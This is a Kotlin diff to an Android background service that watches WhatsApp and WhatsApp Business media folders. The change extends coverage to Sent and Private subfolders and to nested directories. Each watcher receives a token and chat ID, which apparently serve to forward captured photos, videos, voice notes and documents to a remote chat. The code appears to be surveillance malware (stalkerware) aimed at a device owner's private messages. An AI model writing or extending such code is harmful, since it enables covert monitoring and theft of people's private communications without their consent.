@@ -10,10 +10,11 @@ import android.os.Environment
 import android.os.IBinder
 import android.util.Log
 import androidx.core.app.NotificationCompat
+import java.io.File
 
 class MediaMonitorService : Service() {
 
-    private var watchers = mutableListOf<MediaWatcher>()
+    private val watchers = mutableMapOf<String, MediaWatcher>()
 
     override fun onCreate() {
         super.onCreate()
@@ -35,7 +36,7 @@ class MediaMonitorService : Service() {
     }
 
     override fun onDestroy() {
-        watchers.forEach { it.stopWatching() }
+        watchers.values.forEach { it.stopWatching() }
         watchers.clear()
         getSharedPreferences("config", MODE_PRIVATE)
             .edit().putBoolean("running", false).apply()
@@ -82,35 +83,67 @@ class MediaMonitorService : Service() {
         val oldBase = "${Environment.getExternalStorageDirectory()}/WhatsApp/Media"
         basePaths.add(oldBase)
 
+        val oldBusinessBase = "${Environment.getExternalStorageDirectory()}/WhatsApp Business/Media"
+        basePaths.add(oldBusinessBase)
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             val newBase = "${Environment.getExternalStorageDirectory()}/Android/media/com.whatsapp/WhatsApp/Media"
             basePaths.add(newBase)
+
+            val newBusinessBase = "${Environment.getExternalStorageDirectory()}/Android/media/com.whatsapp.w4b/WhatsApp Business/Media"
+            basePaths.add(newBusinessBase)
         }
 
         val subdirs = listOf(
             "WhatsApp Images",
+            "WhatsApp Images/Sent",
+            "WhatsApp Images/Private",
             "WhatsApp Video",
+            "WhatsApp Video/Sent",
+            "WhatsApp Video/Private",
             "WhatsApp Audio",
+            "WhatsApp Audio/Sent",
+            "WhatsApp Audio/Private",
             "WhatsApp Documents",
+            "WhatsApp Documents/Sent",
+            "WhatsApp Documents/Private",
             "WhatsApp Stickers",
             "WhatsApp Animated Gifs",
+            "WhatsApp Animated Gifs/Sent",
             "WhatsApp Voice Notes"
         )
 
         for (base in basePaths) {
             for (sub in subdirs) {
                 val fullPath = "$base/$sub"
+                addWatcher(fullPath, token, chatId)
+
                 try {
-                    val watcher = MediaWatcher(fullPath, token, chatId)
-                    watcher.startWatching()
-                    watchers.add(watcher)
+                    val root = File(fullPath)
+                    if (root.exists() && root.isDirectory) {
+                        root.walkTopDown()
+                            .maxDepth(3)
+                            .filter { it.isDirectory }
+                            .forEach { dir -> addWatcher(dir.absolutePath, token, chatId) }
+                    }
                 } catch (e: Exception) {
-                    Log.e(TAG, "Error en $fullPath", e)
+                    Log.e(TAG, "Error explorando subdirectorios en $fullPath", e)
                 }
             }
         }
 
         Log.d(TAG, "Monitoreando ${watchers.size} directorios")
+    }
+
+    private fun addWatcher(dirPath: String, token: String, chatId: String) {
+        if (watchers.containsKey(dirPath)) return
+        try {
+            val watcher = MediaWatcher(dirPath, token, chatId)
+            watcher.startWatching()
+            watchers[dirPath] = watcher
+        } catch (e: Exception) {
+            Log.e(TAG, "Error en $dirPath", e)
+        }
     }
 
     companion object {
